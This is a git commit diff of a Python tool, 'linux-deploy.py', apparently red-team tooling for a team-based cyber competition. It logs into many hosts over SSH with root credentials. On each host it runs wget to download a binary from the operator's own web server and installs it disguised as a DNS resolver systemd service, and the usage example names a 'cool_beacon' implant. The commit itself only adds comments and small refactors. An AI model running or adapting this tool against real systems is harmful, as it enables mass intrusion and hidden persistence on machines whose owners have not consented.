a69a8b96b880617e47f4cf8767265cf4b5a9962e
Ryan Cervantes <rxc3202@rit.edu>
2020-10-15 01:18:29 -0400

    update comments

--- linux-deploy.py
+++ linux-deploy.py
@@ -10,6 +10,7 @@ from http.server import SimpleHTTPRequestHandler
 from multiprocessing import Process
 from socketserver import TCPServer
 
+# The commands that will be run over SSH on the target machines in order of execution
 COMMANDS = [
     "wget http://10.0.4.25/resolution -O /usr/bin/ldns-resolver",
     "wget http://10.0.4.25/system-dns.service -O /usr/lib/systemd/system/system-dns.service",
@@ -17,10 +18,13 @@ COMMANDS = [
     "systemctl enable system-dns",
     "systemctl start system-dns"
 ]
+# The IP address of the machine running this script in the network
 SERVER = "10.0.4.25"
+# The code will call os.chdir() before serving, no need for adding subdir in URL
 WEBDIR = os.path.join(os.path.dirname(__file__), 'files')
 
-parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
+parser = argparse.ArgumentParser(
+formatter_class=argparse.RawTextHelpFormatter,
 description="""
 Linux Deployment via SSH and HTTP. Given a directory, this script will stand up a temproary
 webserver to host files and can use that webserver to pull down files via SSH. You must
@@ -30,9 +34,9 @@ Example:
         Deploy a Linux Service remotely to teams 1,4,7 on hosts 3,5,22, given elevated
         credetnials root:Sup3rS3cure! on the network topology of 10.[TeamNumber].20.[Host]
 
-        $ python3 linux-deploy.py --teams=1,4,7 --hosts 3,5,22 root Sup3rS3cure! 10.X.20.Y
+        $ python3 linux-deploy.py --teams=1,4,7 --hosts=3,5,22 root Sup3rS3cure! 10.X.20.Y
 
-        cat linux-deploy.py
+        $ cat linux-deploy.py
         ... SNIP ...
         COMMANDS = [
             "wget http://10.0.4.25/cool_beacon -O /usr/bin/beacon_binary",
@@ -51,8 +55,8 @@ parser.add_argument("password", type=str)
 parser.add_argument("targets", type=str, nargs='+', help="Addresses to deploy to. (e.g 10.X.2.Y or 10.4.5.10)")
 parser.add_argument("--teams", type=str, nargs=1, default="1", help="The number of teams. Will replace X with (e.g 1,2,4,9)")
 parser.add_argument("--hosts", type=str, nargs=1, default="1", help="The specific host numbers. Will replace Y. (e.g 1,2,4,8,20)")
-parser.add_argument("--threads", type=int, nargs=1, default=5, help="The number of workers to use to deploy")
-parser.add_argument("--check", action="store_true", help="View the targets to confirm before deployment. Will not run commands.")
+parser.add_argument("--threads", type=int, nargs=1, default=5, help="The number of workers to use to deploy. Default 5")
+parser.add_argument("--check", action="store_true", help="View the targets before deployment. No SSH or HTTP activity.")
 
 def process_args():
     global addresses
@@ -65,7 +69,7 @@ def process_args():
     if args.teams:
         args.teams = args.teams[0].split(',')
 
-    # Generate targets from specifications
+    # Generate targets from option specifications
     addresses = []
     team_number = re.compile(r"[xX]")
     host_number = re.compile(r"[yY]")
@@ -80,16 +84,19 @@ def process_args():
                     addresses.append(out)
 
 def deploy(host, username, password):
+    status_code = 0
+    err = ""
     try:
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(hostname=host, username=username, password=password)
-        status_code = 0
-        err = ""
         for command in COMMANDS:
             binary = command.split(" ")[0]
             _, stdout, stderr = client.exec_command(command)
+            # all returns must be 0. Adding all together must == 0
             status_code += int(stdout.channel.recv_exit_status())
+            # accumulate all error messages to display each to user
+            # in order of appearance to let user know which commands failed
             err += f"\t[{binary}] {stderr.readline().strip()}\n"
             if status_code:
                 break
@@ -102,11 +109,9 @@ def deploy(host, username, password):
 def run():
     global failures
     failures = []
-
-    if WEBDIR:
-        pid = os.fork()
-    else:
-        pid = 1 # We don't need the webserver if its None, skip
+    
+    # We don't need the webserver if we're not using
+    pid = os.fork() if WEBDIR else 1
 
     # Child process will handle standing up webserver
     if pid == 0:
@@ -123,12 +128,14 @@ def run():
         except Exception as e:
             print(f"[STATUS] Error standing up webserver: {str(e)}")
     else:
+        # Make sure the webserver starts before commands are sent
         time.sleep(1)
         print("[STATUS] Starting deployment...")
         with ThreadPoolExecutor(args.threads) as pool:
             # For each host we need to deploy to, submit a request
-            # to the pool to run the command This will yield a
-            # concurrent.Future object and map the address string to that object
+            # to the pool to run the command. This will yield a Future object
+            # while invoking the method and map the ip address to that object
+            # later use for status information
             tasks = {pool.submit(deploy, host, args.username, args.password): host for host in addresses}
             # As tasks are completed by the pool, they will appear
             # in the output of as_completed(tasks)
@@ -142,10 +149,10 @@ def run():
                     success(f"[{ip}] SUCCESS.")
 
         print("[STATUS] Deployment Complete.")
-        # Stop the webserver
+        print(f"Failed Deployments: {' '.join(failures)}")
+        # Stop the webserver if we are using it
         if WEBDIR:
             os.kill(pid, signal.SIGKILL)
-        print(f"Failed Deployments: {' '.join(failures)}")
 
 def failure(output): print(f"\033[91m {output}\033[00m") 
 
